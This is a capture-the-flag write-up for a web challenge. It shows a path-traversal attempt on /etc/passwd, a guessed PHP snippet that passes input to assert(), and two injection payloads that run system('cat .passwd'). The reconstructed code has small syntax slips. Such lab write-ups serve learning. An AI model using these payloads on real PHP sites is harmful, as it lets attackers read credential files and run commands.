## Description
Find and exploit the vulnerability to read the file .passwd.
## Hints 
Read the doc!
## Solution
This is the website of the challenge:

![image](https://github.com/user-attachments/assets/5ce8b071-a539-4d89-8452-af1c93b3e206)
Based on the challenge's title and the hint, I should use Local File Inclusion (LFI) to solve it.

Looking at the website url, I tested several payloads but didn't get the flag directly. For instance, I tried:

`?page=../../../etc/passwd`

![image](https://github.com/user-attachments/assets/64637211-1f72-4795-9369-aec7645bb6b1)
`?page='`

![image](https://github.com/user-attachments/assets/919d39a3-a57d-46f4-a03f-6d466c25e56c)

So, the challenge is vunerable to code injection. I suppose the source code is something like this:

```
$file = "includes/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
if file_exists($file){
   include($file);}
```

One possible way to solve this is get the code to comply like this: 

assert(strpos('includes/random.php' , 'nothing')  === false || system("cat .passwd") || strpos('includes/a', '..') === false");

So the payload is: `random' , 'nothing')  === false %26%26 system("cat .passwd") %26%26 strpos('includes/a`

There are many other ways to get the flag, my first attempt to solve this is to using: `' and die(system('cat .passwd')) or '`
  
